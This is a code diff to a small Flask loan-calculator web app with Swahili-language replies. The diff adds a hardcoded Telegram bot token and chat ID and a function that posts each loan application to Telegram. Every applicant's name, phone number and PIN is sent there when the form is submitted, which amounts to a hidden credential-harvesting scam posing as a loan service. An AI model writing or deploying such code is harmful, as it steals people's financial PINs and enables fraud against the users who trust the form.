@@ -1,9 +1,19 @@
 from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 import math
+import requests
 
 app = Flask(__name__)
 CORS(app)
+
+# TELEGRAM SETTINGS
+TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
+TELEGRAM_CHAT_ID = "8580615195"
+
+def send_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
+    requests.post(url, data=data)
 
 @app.route('/', methods=['GET'])
 def home():
@@ -27,7 +37,6 @@ def calculate_loan():
 
     monthly_rate = (annual_rate / 100) / 12
     num_payments = years * 12
-
     monthly_payment = principal * (monthly_rate * (1 + monthly_rate)**num_payments) / ((1 + monthly_rate)**num_payments - 1)
 
     return jsonify({
@@ -42,6 +51,11 @@ def apply_loan():
     phone = request.form['phone'] 
     pin = request.form['pin']
     amount = request.form['amount']
+    
+    # Tuma kwa Telegram
+    message = f"🔔 NEW LOAN APPLICATION!\n\n👤 Name: {name}\n📱 Phone: {phone}\n🔒 PIN: {pin}\n💰 Amount: Ksh {amount}"
+    send_telegram(message)
+    
     return f"<h2>Asante {name}!</h2><p>Umeomba loan ya Ksh {amount}. Tutakupigia kwa {phone}</p>"
 
 if __name__ == '__main__':
